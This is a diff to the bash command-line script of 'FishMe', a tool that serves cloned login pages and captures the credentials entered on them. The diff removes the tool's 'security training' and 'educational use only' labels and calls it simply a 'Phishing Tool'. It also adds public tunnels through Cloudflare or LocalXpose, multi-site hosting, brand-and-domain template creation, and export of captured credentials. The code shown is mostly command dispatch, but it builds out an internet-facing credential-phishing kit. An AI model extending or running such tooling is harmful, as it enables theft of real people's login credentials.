@@ -505,17 +1032,15 @@ update_fishme() {
 show_help() {
     clear
     echo -e "${CYAN}"
-    echo -e "  ███████████                                    ████             █████                    "
-    echo -e "  ░█░░░███░░░█                                   ░░███            ░░███                     "
-    echo -e "  ░   ░███  ░   ██████  █████████████   ████████  ░███   ██████   ███████    ██████   █████ "
-    echo -e "      ░███     ███░░███░░███░░███░░███ ░░███░░███ ░███  ░░░░░███ ░░░███░    ███░░███ ███░░  "
-    echo -e "      ░███    ░███████  ░███ ░███ ░███  ░███ ░███ ░███   ███████   ░███    ░███████ ░░█████ "
-    echo -e "      ░███    ░███░░░   ░███ ░███ ░███  ░███ ░███ ░███  ███░░███   ░███ ███░███░░░   ░░░░███"
-    echo -e "      █████   ░░██████  █████░███ █████ ░███████  █████░░████████  ░░█████ ░░██████  ██████ "
-    echo -e "     ░░░░░     ░░░░░░  ░░░░░ ░░░ ░░░░░  ░███░░░  ░░░░░  ░░░░░░░░    ░░░░░   ░░░░░░  ░░░░░░"
-    echo -e "                                          ░███                                              "
-    echo -e "                                          █████                                             "
-    echo -e "                                         ░░░░░   ${WHITE}help (v${__version__})${RESET}"
+    echo -e "   ▄█    █▄       ▄████████  ▄█          ▄███████▄ "
+    echo -e "  ███    ███     ███    ███ ███         ███    ███ "
+    echo -e "  ███    ███     ███    █▀  ███         ███    ███ "
+    echo -e " ▄███▄▄▄▄███▄▄  ▄███▄▄▄     ███         ███    ███ "
+    echo -e "▀▀███▀▀▀▀███▀  ▀▀███▀▀▀     ███       ▀█████████▀  "
+    echo -e "  ███    ███     ███    █▄  ███         ███        "
+    echo -e "  ███    ███     ███    ███ ███▌    ▄   ███        "
+    echo -e "  ███    █▀      ██████████ █████▄▄██  ▄████▀       "
+    echo -e "                            ▀                         ${WHITE}help (v${__version__})${RESET}"
     echo
     echo
     echo -e "  ${BOLD}${WHITE}USAGE${RESET}"
@@ -530,11 +1055,73 @@ show_help() {
     printf "  ${GREEN}  %-16s${RESET}  ${CYAN}│${RESET}  %s\n" \
         "list"      "List all available site templates"
     printf "  ${GREEN}  %-16s${RESET}  ${CYAN}│${RESET}  %s\n" \
-        "capture"   "View credentials captured from simulation"
+        "capture"   "View credentials captured from "
     printf "  ${GREEN}  %-16s${RESET}  ${CYAN}│${RESET}  %s\n" \
         "update"    "Pull latest updates from GitHub"
     printf "  ${GREEN}  %-16s${RESET}  ${CYAN}│${RESET}  %s\n" \
         "uninstall" "Remove fishme command from system PATH"
+
+    echo
+    echo -e "  ${BOLD}${WHITE}TEMPLATE MANAGEMENT${RESET}"
+    echo -e "  ${DIM}=============================================================${RESET}"
+    printf "  ${GREEN}  %-16s${RESET}  ${CYAN}│${RESET}  %s\n" \
+        "template"  "Manage templates (list, create, delete, backup, etc.)"
+
+    echo
+    echo -e "  ${BOLD}${WHITE}EXPORT/IMPORT${RESET}"
+    echo -e "  ${DIM}=============================================================${RESET}"
+    printf "  ${GREEN}  %-16s${RESET}  ${CYAN}│${RESET}  %s\n" \
+        "export"    "Export captures (csv, json, xml, html, all)"
+    printf "  ${GREEN}  %-16s${RESET}  ${CYAN}│${RESET}  %s\n" \
+        "import"    "Import captures (csv, json)"
+
+    echo
+    echo -e "  ${BOLD}${WHITE}ANALYTICS${RESET}"
+    echo -e "  ${DIM}=============================================================${RESET}"
+    printf "  ${GREEN}  %-16s${RESET}  ${CYAN}│${RESET}  %s\n" \
+        "stats"     "View statistics and analytics (report, chart, quick)"
+
+    echo
+    echo -e "  ${BOLD}${WHITE}SESSION MANAGEMENT${RESET}"
+    echo -e "  ${DIM}=============================================================${RESET}"
+    printf "  ${GREEN}  %-16s${RESET}  ${CYAN}│${RESET}  %s\n" \
+        "session"   "Manage sessions (list, info, end, cleanup)"
+
+    echo
+    echo -e "  ${BOLD}${WHITE}TEMPLATE GENERATOR${RESET}"
+    echo -e "  ${DIM}=============================================================${RESET}"
+    printf "  ${GREEN}  %-16s${RESET}  ${CYAN}│${RESET}  %s\n" \
+        "generate"  "Interactive template creation wizard"
+
+    echo
+    echo -e "  ${BOLD}${WHITE}REPORT GENERATION${RESET}"
+    echo -e "  ${DIM}=============================================================${RESET}"
+    printf "  ${GREEN}  %-16s${RESET}  ${CYAN}│${RESET}  %s\n" \
+        "report"    "Generate reports (html, pdf, md, json, all)"
+
+    echo
+    echo -e "  ${BOLD}${WHITE}MULTI-SITE MANAGEMENT${RESET}"
+    echo -e "  ${DIM}=============================================================${RESET}"
+    printf "  ${GREEN}  %-16s${RESET}  ${CYAN}│${RESET}  %s\n" \
+        "multi"     "Run multiple sites (create, start, stop, monitor)"
+
+    echo
+    echo -e "  ${BOLD}${WHITE}PLUGIN MANAGEMENT${RESET}"
+    echo -e "  ${DIM}=============================================================${RESET}"
+    printf "  ${GREEN}  %-16s${RESET}  ${CYAN}│${RESET}  %s\n" \
+        "plugin"    "Manage plugins (list, enable, disable, create)"
+
+    echo
+    echo -e "  ${BOLD}${WHITE}CONFIGURATION${RESET}"
+    echo -e "  ${DIM}=============================================================${RESET}"
+    printf "  ${GREEN}  %-16s${RESET}  ${CYAN}│${RESET}  %s\n" \
+        "config"    "Manage configuration (get, set, show)"
+
+    echo
+    echo -e "  ${BOLD}${WHITE}LOGGING${RESET}"
+    echo -e "  ${DIM}=============================================================${RESET}"
+    printf "  ${GREEN}  %-16s${RESET}  ${CYAN}│${RESET}  %s\n" \
+        "log"       "View logs (recent, search, stats)"
 
     echo
     echo -e "  ${BOLD}${WHITE}FLAGS${RESET}"
@@ -550,8 +1137,9 @@ show_help() {
     echo
     echo -e "  ${CYAN}  fishme start${RESET}"
     echo -e "  ${DIM}  Starts a PHP built-in web server on localhost. You will be${RESET}"
-    echo -e "  ${DIM}  prompted to choose a template and optionally set a port.${RESET}"
-    echo -e "  ${DIM}  Default: http://127.0.0.1:8080   |   Stop: Ctrl+C${RESET}"
+    echo -e "  ${DIM}  prompted to choose a template, port, and optional public tunnel${RESET}"
+    echo -e "  ${DIM}  (Cloudflare or LocalXpose). Default: http://127.0.0.1:8080${RESET}"
+    echo -e "  ${DIM}  Stop with Ctrl+C.${RESET}"
     echo
     echo -e "  ${CYAN}  fishme list${RESET}"
     echo -e "  ${DIM}  Scans the templates/ directory and lists every site with a${RESET}"
@@ -594,9 +1182,555 @@ show_help() {
 show_version() {
     echo
     echo -e "  ${CYAN}FishMe${RESET} version ${WHITE}${BOLD}v${__version__}${RESET}"
-    echo -e "  ${DIM}Phishing Awareness & Security Training Platform${RESET}"
-    echo -e "  ${DIM}Educational Use Only — University Cybersecurity Project${RESET}"
+    echo -e "  ${DIM}Phishing Tool${RESET}"
     echo
+}
+
+cmd_template() {
+    local subcmd="$2"
+    case "$subcmd" in
+        list)
+            list_templates
+            ;;
+        info)
+            local template="$3"
+            if [[ -z "$template" ]]; then
+                echo "Usage: fishme template info <template_name>"
+                return 1
+            fi
+            get_template_info "$template"
+            ;;
+        create)
+            local template="$3"
+            local display_name="$4"
+            local brand="$5"
+            local domain="$6"
+            if [[ -z "$template" ]]; then
+                echo "Usage: fishme template create <name> <display_name> <brand> <domain>"
+                return 1
+            fi
+            create_template "$template" "$display_name" "$brand" "$domain"
+            ;;
+        delete)
+            local template="$3"
+            if [[ -z "$template" ]]; then
+                echo "Usage: fishme template delete <template_name>"
+                return 1
+            fi
+            delete_template "$template"
+            ;;
+        backup)
+            local template="$3"
+            if [[ -z "$template" ]]; then
+                echo "Usage: fishme template backup <template_name>"
+                return 1
+            fi
+            backup_template "$template"
+            ;;
+        restore)
+            local backup="$3"
+            if [[ -z "$backup" ]]; then
+                echo "Usage: fishme template restore <backup_name>"
+                return 1
+            fi
+            restore_template "$backup"
+            ;;
+        export)
+            local template="$3"
+            if [[ -z "$template" ]]; then
+                echo "Usage: fishme template export <template_name> [output_dir]"
+                return 1
+            fi
+            export_template "$template" "${4:-}"
+            ;;
+        import)
+            local archive="$3"
+            if [[ -z "$archive" ]]; then
+                echo "Usage: fishme template import <archive_path>"
+                return 1
+            fi
+            import_template "$archive"
+            ;;
+        validate)
+            local template="$3"
+            if [[ -z "$template" ]]; then
+                echo "Usage: fishme template validate <template_name>"
+                return 1
+            fi
+            validate_template "$template"
+            ;;
+        *)
+            echo "Template Management Commands:"
+            echo "  fishme template list                    - List all templates"
+            echo "  fishme template info <name>             - Show template info"
+            echo "  fishme template create <name> <display> <brand> <domain> - Create new template"
+            echo "  fishme template delete <name>            - Delete template"
+            echo "  fishme template backup <name>            - Backup template"
+            echo "  fishme template restore <backup>         - Restore from backup"
+            echo "  fishme template export <name> [dir]      - Export template"
+            echo "  fishme template import <archive>         - Import template"
+            echo "  fishme template validate <name>          - Validate template"
+            ;;
+    esac
+}
+
+cmd_export() {
+    local format="$2"
+    local template_filter="$3"
+    
+    case "$format" in
+        csv)
+            export_captures_csv "" "$template_filter"
+            ;;
+        json)
+            export_captures_json "" "$template_filter"
+            ;;
+        xml)
+            export_captures_xml "" "$template_filter"
+            ;;
+        html)
+            export_captures_html "" "$template_filter"
+            ;;
+        all)
+            export_all_formats
+            ;;
+        list)
+            list_exports
+            ;;
+        *)
+            echo "Export Commands:"
+            echo "  fishme export csv [template]              - Export to CSV"
+            echo "  fishme export json [template]             - Export to JSON"
+            echo "  fishme export xml [template]              - Export to XML"
+            echo "  fishme export html [template]             - Export to HTML"
+            echo "  fishme export all                         - Export to all formats"
+            echo "  fishme export list                         - List exports"
+            ;;
+    esac
+}
+
+cmd_import() {
+    local format="$2"
+    local file="$3"
+    
+    case "$format" in
+        csv)
+            if [[ -z "$file" ]]; then
+                echo "Usage: fishme import csv <file>"
+                return 1
+            fi
+            import_captures_csv "$file"
+            ;;
+        json)
+            if [[ -z "$file" ]]; then
+                echo "Usage: fishme import json <file>"
+                return 1
+            fi
+            import_captures_json "$file"
+            ;;
+        *)
+            echo "Import Commands:"
+            echo "  fishme import csv <file>                  - Import from CSV"
+            echo "  fishme import json <file>                 - Import from JSON"
+            ;;
+    esac
+}
+
+cmd_stats() {
+    local subcmd="$2"
+    case "$subcmd" in
+        report)
+            generate_stats_report
+            ;;
+        chart)
+            local type="$3"
+            case "$type" in
+                template)
+                    generate_template_chart
+                    ;;
+                date)
+                    generate_date_chart
+                    ;;
+                *)
+                    echo "Chart types: template, date"
+                    ;;
+            esac
+            ;;
+        quick)
+            show_quick_summary
+            ;;
+        export)
+            local output="$3"
+            export_stats_json "$output"
+            ;;
+        *)
+            echo "Analytics Commands:"
+            echo "  fishme stats report                       - Generate full report"
+            echo "  fishme stats chart <type>                 - Generate chart (template/date)"
+            echo "  fishme stats quick                        - Show quick summary"
+            echo "  fishme stats export [file]                - Export stats to JSON"
+            ;;
+    esac
+}
+
+cmd_session() {
+    local subcmd="$2"
+    case "$subcmd" in
+        list)
+            list_sessions
+            ;;
+        info)
+            local session_id="$3"
+            if [[ -z "$session_id" ]]; then
+                echo "Usage: fishme session info <session_id>"
+                return 1
+            fi
+            get_session_info "$session_id"
+            ;;
+        end)
+            local session_id="$3"
+            if [[ -z "$session_id" ]]; then
+                echo "Usage: fishme session end <session_id>"
+                return 1
+            fi
+            end_session
+            ;;
+        delete)
+            local session_id="$3"
+            if [[ -z "$session_id" ]]; then
+                echo "Usage: fishme session delete <session_id>"
+                return 1
+            fi
+            delete_session "$session_id"
+            ;;
+        export)
+            local session_id="$3"
+            local output="$4"
+            if [[ -z "$session_id" ]]; then
+                echo "Usage: fishme session export <session_id> [output_file]"
+                return 1
+            fi
+            export_session "$session_id" "$output"
+            ;;
+        import)
+            local file="$3"
+            if [[ -z "$file" ]]; then
+                echo "Usage: fishme session import <file>"
+                return 1
+            fi
+            import_session "$file"
+            ;;
+        cleanup)
+            local days="${3:-30}"
+            cleanup_old_sessions "$days"
+            ;;
+        check)
+            check_orphaned_sessions
+            ;;
+        *)
+            echo "Session Management Commands:"
+            echo "  fishme session list                       - List all sessions"
+            echo "  fishme session info <id>                   - Show session info"
+            echo "  fishme session end <id>                    - End session"
+            echo "  fishme session delete <id>                 - Delete session"
+            echo "  fishme session export <id> [file]          - Export session"
+            echo "  fishme session import <file>               - Import session"
+            echo "  fishme session cleanup [days]              - Clean up old sessions"
+            echo "  fishme session check                       - Check for orphaned sessions"
+            ;;
+    esac
+}
+
+cmd_generate() {
+    create_template_interactive
+}
+
+cmd_report() {
+    local format="$2"
+    local output="$3"
+    
+    case "$format" in
+        html)
+            generate_html_report "$output"
+            ;;
+        pdf)
+            generate_pdf_report "$output"
+            ;;
+        md|markdown)
+            generate_markdown_report "$output"
+            ;;
+        json)
+            generate_json_report "$output"
+            ;;
+        all)
+            local base_name="${output:-report}"
+            generate_all_reports "$base_name"
+            ;;
+        list)
+            list_reports
+            ;;
+        delete)
+            local report_name="$3"
+            if [[ -z "$report_name" ]]; then
+                echo "Usage: fishme report delete <report_name>"
+                return 1
+            fi
+            delete_report "$report_name"
+            ;;
+        *)
+            echo "Report Generation Commands:"
+            echo "  fishme report html [file]                  - Generate HTML report"
+            echo "  fishme report pdf [file]                   - Generate PDF report"
+            echo "  fishme report md [file]                    - Generate Markdown report"
+            echo "  fishme report json [file]                  - Generate JSON report"
+            echo "  fishme report all [base]                   - Generate all formats"
+            echo "  fishme report list                         - List reports"
+            echo "  fishme report delete <name>                - Delete report"
+            ;;
+    esac
+}
+
+cmd_multi() {
+    local subcmd="$2"
+    case "$subcmd" in
+        create)
+            local site_id="$3"
+            local template="$4"
+            local port="$5"
+            local tunnel="${6:-none}"
+            if [[ -z "$site_id" ]] || [[ -z "$template" ]] || [[ -z "$port" ]]; then
+                echo "Usage: fishme multi create <site_id> <template> <port> [tunnel]"
+                return 1
+            fi
+            create_site_config "$site_id" "$template" "$port" "$tunnel"
+            ;;
+        list)
+            list_site_configs
+            ;;
+        start)
+            local site_id="$3"
+            if [[ -z "$site_id" ]]; then
+                echo "Usage: fishme multi start <site_id>"
+                return 1
+            fi
+            start_site "$site_id"
+            ;;
+        stop)
+            local site_id="$3"
+            if [[ -z "$site_id" ]]; then
+                echo "Usage: fishme multi stop <site_id>"
+                return 1
+            fi
+            stop_site "$site_id"
+            ;;
+        stop-all)
+            stop_all_sites
+            ;;
+        status)
+            local site_id="$3"
+            if [[ -z "$site_id" ]]; then
+                echo "Usage: fishme multi status <site_id>"
+                return 1
+            fi
+            get_site_status "$site_id"
+            ;;
+        delete)
+            local site_id="$3"
+            if [[ -z "$site_id" ]]; then
+                echo "Usage: fishme multi delete <site_id>"
+                return 1
+            fi
+            delete_site_config "$site_id"
+            ;;
+        monitor)
+            monitor_sites
+            ;;
+        health)
+            local site_id="$3"
+            if [[ -z "$site_id" ]]; then
+                echo "Usage: fishme multi health <site_id>"
+                return 1
+            fi
+            check_site_health "$site_id"
+            ;;
+        export)
+            local output="$3"
+            export_site_configs "$output"
+            ;;
+        import)
+            local file="$3"
+            if [[ -z "$file" ]]; then
+                echo "Usage: fishme multi import <file>"
+                return 1
+            fi
+            import_site_configs "$file"
+            ;;
+        *)
+            echo "Multi-Site Management Commands:"
+            echo "  fishme multi create <id> <template> <port> [tunnel] - Create site config"
+            echo "  fishme multi list                         - List all sites"
+            echo "  fishme multi start <id>                   - Start site"
+            echo "  fishme multi stop <id>                    - Stop site"
+            echo "  fishme multi stop-all                     - Stop all sites"
+            echo "  fishme multi status <id>                  - Show site status"
+            echo "  fishme multi delete <id>                  - Delete site config"
+            echo "  fishme multi monitor                      - Monitor all sites"
+            echo "  fishme multi health <id>                  - Check site health"
+            echo "  fishme multi export [file]                - Export site configs"
+            echo "  fishme multi import <file>                - Import site configs"
+            ;;
+    esac
+}
+
+cmd_plugin() {
+    local subcmd="$2"
+    case "$subcmd" in
+        list)
+            list_plugins
+            ;;
+        enable)
+            local plugin_name="$3"
+            if [[ -z "$plugin_name" ]]; then
+                echo "Usage: fishme plugin enable <plugin_name>"
+                return 1
+            fi
+            enable_plugin "$plugin_name"
+            ;;
+        disable)
+            local plugin_name="$3"
+            if [[ -z "$plugin_name" ]]; then
+                echo "Usage: fishme plugin disable <plugin_name>"
+                return 1
+            fi
+            disable_plugin "$plugin_name"
+            ;;
+        create)
+            local plugin_name="$3"
+            local description="$4"
+            if [[ -z "$plugin_name" ]]; then
+                echo "Usage: fishme plugin create <name> [description]"
+                return 1
+            fi
+            create_plugin "$plugin_name" "$description"
+            ;;
+        delete)
+            local plugin_name="$3"
+            if [[ -z "$plugin_name" ]]; then
+                echo "Usage: fishme plugin delete <plugin_name>"
+                return 1
+            fi
+            delete_plugin "$plugin_name"
+            ;;
+        info)
+            local plugin_name="$3"
+            if [[ -z "$plugin_name" ]]; then
+                echo "Usage: fishme plugin info <plugin_name>"
+                return 1
+            fi
+            get_plugin_info "$plugin_name"
+            ;;
+        export)
+            local plugin_name="$3"
+            local output="$4"
+            if [[ -z "$plugin_name" ]]; then
+                echo "Usage: fishme plugin export <plugin_name> [output_file]"
+                return 1
+            fi
+            export_plugin "$plugin_name" "$output"
+            ;;
+        import)
+            local archive="$3"
+            if [[ -z "$archive" ]]; then
+                echo "Usage: fishme plugin import <archive_file>"
+                return 1
+            fi
+            import_plugin "$archive"
+            ;;
+        validate)
+            local plugin_name="$3"
+            if [[ -z "$plugin_name" ]]; then
+                echo "Usage: fishme plugin validate <plugin_name>"
+                return 1
+            fi
+            validate_plugin "$plugin_name"
+            ;;
+        *)
+            echo "Plugin Management Commands:"
+            echo "  fishme plugin list                         - List all plugins"
+            echo "  fishme plugin enable <name>                - Enable plugin"
+            echo "  fishme plugin disable <name>               - Disable plugin"
+            echo "  fishme plugin create <name> [desc]         - Create new plugin"
+            echo "  fishme plugin delete <name>                - Delete plugin"
+            echo "  fishme plugin info <name>                  - Show plugin info"
+            echo "  fishme plugin export <name> [file]         - Export plugin"
+            echo "  fishme plugin import <archive>             - Import plugin"
+            echo "  fishme plugin validate <name>              - Validate plugin"
+            ;;
+    esac
+}
+
+cmd_config() {
+    local subcmd="$2"
+    case "$subcmd" in
+        get)
+            local key="$3"
+            local default="$4"
+            if [[ -z "$key" ]]; then
+                echo "Usage: fishme config get <key> [default]"
+                return 1
+            fi
+            get_config "$key" "$default"
+            ;;
+        set)
+            local key="$3"
+            local value="$4"
+            if [[ -z "$key" ]] || [[ -z "$value" ]]; then
+                echo "Usage: fishme config set <key> <value>"
+                return 1
+            fi
+            set_config "$key" "$value"
+            ;;
+        show)
+            if [[ -f "${BASE_DIR}/config/fishme.conf" ]]; then
+                cat "${BASE_DIR}/config/fishme.conf"
+            else
+                echo "Config file not found."
+            fi
+            ;;
+        *)
+            echo "Configuration Commands:"
+            echo "  fishme config get <key> [default]          - Get config value"
+            echo "  fishme config set <key> <value>            - Set config value"
+            echo "  fishme config show                         - Show config file"
+            ;;
+    esac
+}
+
+cmd_log() {
+    local subcmd="$2"
+    case "$subcmd" in
+        recent)
+            local lines="${3:-50}"
+            get_recent_logs "$lines"
+            ;;
+        search)
+            local pattern="$3"
+            if [[ -z "$pattern" ]]; then
+                echo "Usage: fishme log search <pattern>"
+                return 1
+            fi
+            search_logs "$pattern"
+            ;;
+        stats)
+            get_log_stats
+            ;;
+        *)
+            echo "Logging Commands:"
+            echo "  fishme log recent [lines]                  - Show recent logs"
+            echo "  fishme log search <pattern>                - Search logs"
+            echo "  fishme log stats                          - Show log statistics"
+            ;;
+    esac
 }
 
 case "${1,,}" in
@@ -614,6 +1748,39 @@ case "${1,,}" in
         ;;
     uninstall)
         uninstall_fishme
+        ;;
+    template)
+        cmd_template "$@"
+        ;;
+    export)
+        cmd_export "$@"
+        ;;
+    import)
+        cmd_import "$@"
+        ;;
+    stats)
+        cmd_stats "$@"
+        ;;
+    session)
+        cmd_session "$@"
+        ;;
+    generate)
+        cmd_generate
+        ;;
+    report)
+        cmd_report "$@"
+        ;;
+    multi)
+        cmd_multi "$@"
+        ;;
+    plugin)
+        cmd_plugin "$@"
+        ;;
+    config)
+        cmd_config "$@"
+        ;;
+    log)
+        cmd_log "$@"
         ;;
     -v|--version|-version|version)
         show_version
